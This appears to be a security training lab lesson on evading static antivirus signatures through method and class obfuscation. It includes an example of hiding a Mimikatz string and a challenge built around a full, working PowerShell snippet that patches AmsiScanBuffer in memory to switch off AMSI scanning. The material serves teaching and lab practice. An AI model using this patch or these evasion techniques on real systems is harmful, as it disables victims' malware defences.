# Static Code-Based Signature Evasion

Once a troublesome signature is identified, you must decide how to address it. Depending on the signature's strength and type, it may be bypassed using simple obfuscation (see **Obfuscation Principles**) or may require more targeted investigation and remediation. This section provides several solutions for remedying static signatures in functions.

## Layered Obfuscation Taxonomy

The **Layered Obfuscation Taxonomy** outlines reliable solutions, particularly within the *Obfuscating Methods* and *Obfuscating Classes* layers.

### Obfuscating Methods

| Obfuscation Method         | Purpose                                         |
|---------------------------|-------------------------------------------------|
| Method Proxy              | Creates a proxy method or replacement object     |
| Method Scattering/Aggregation | Combine multiple methods into one or split a method into several |
| Method Clone              | Create replicas of a method and randomly call each |

### Obfuscating Classes

| Obfuscation Method        | Purpose                                         |
|--------------------------|-------------------------------------------------|
| Class Hierarchy Flattening | Create proxies for classes using interfaces     |
| Class Splitting/Coalescing | Transfer local variables or instruction groups to another class |
| Dropping Modifiers        | Remove class modifiers (public, private) and make all members public |

Despite the technical terms, these methods can be grouped into core, agnostic techniques applicable to any object or data structure:

- **Splitting or Merging Objects:** Techniques like class splitting/coalescing and method scattering/aggregation.
- **Removing or Obscuring Identifiable Information:** Techniques like dropping modifiers or method cloning.

---

## Splitting and Merging Objects

Splitting or merging objects is similar to concatenation (see **Obfuscation Principles**). The goal is to create a new object or function that breaks the signature while maintaining functionality.

**Example: Obfuscating a Detected String**

Original string detected:

```csharp
string MessageFormat = @"{{""GUID"":""{0}"",""Type"":{1},""Meta"":""{2},""IV"":""{3}"",""EncryptedMessage"":""{4}"",""HMAC"":""{5}""}}";
```

Obfuscated method using a new class:

```csharp
public static string GetMessageFormat
{
    get
    {
        var sb = new StringBuilder(@"{{""GUID"":""{0}"",");
        sb.Append(@"""Type"":{1},");
        sb.Append(@"""Meta"":""{2}"",");
        sb.Append(@"""IV"":""{3}"",");
        sb.Append(@"""EncryptedMessage"":""{4}"",");
        sb.Append(@"""HMAC"":""{5}""}}");
        return sb.ToString();
    }
}

string MessageFormat = GetMessageFormat;
```

Here, class splitting is used to create a new class for the local variable to concatenate. Recognizing when to use a specific method will be covered later.

---

## Removing and Obscuring Identifiable Information

This concept is similar to obscuring variable names (see **Obfuscation Principles**), but specifically targets identified signatures in objects, methods, and classes.

**Example:** In Mimikatz, the string `wdigest.dll` can trigger alerts. Replacing it with a random identifier throughout the code can bypass detection (method proxy technique).

---

## Practical Challenge: Obfuscate a PowerShell Snippet

Using the knowledge from this section, obfuscate the following PowerShell snippet. Use **AmsiTrigger** to visualize signatures.

```powershell
$MethodDefinition = "

    [DllImport(`"kernel32`")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport(`"kernel32`")]
    public static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport(`"kernel32`")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
";

$Kernel32 = Add-Type -MemberDefinition $MethodDefinition -Name 'Kernel32' -NameSpace 'Win32' -PassThru;
$A = "AmsiScanBuffer"
$handle = [Win32.Kernel32]::GetModuleHandle('amsi.dll');
[IntPtr]$BufferAddress = [Win32.Kernel32]::GetProcAddress($handle, $A);
[UInt32]$Size = 0x5;
[UInt32]$ProtectFlag = 0x40;
[UInt32]$OldProtectFlag = 0;
[Win32.Kernel32]::VirtualProtect($BufferAddress, $Size, $ProtectFlag, [Ref]$OldProtectFlag);
$buf = [Byte[]]([UInt32]0xB8,[UInt32]0x57, [UInt32]0x00, [Uint32]0x07, [Uint32]0x80, [Uint32]0xC3); 

[system.runtime.interopservices.marshal]::copy($buf, 0, $BufferAddress, 6);
```

Once sufficiently obfuscated, submit the snippet to the webserver at `http://MACHINE_IP/challenge-1.html`. Save the file as `challenge-1.ps1`. If correctly obfuscated, a flag will appear in an alert pop-up.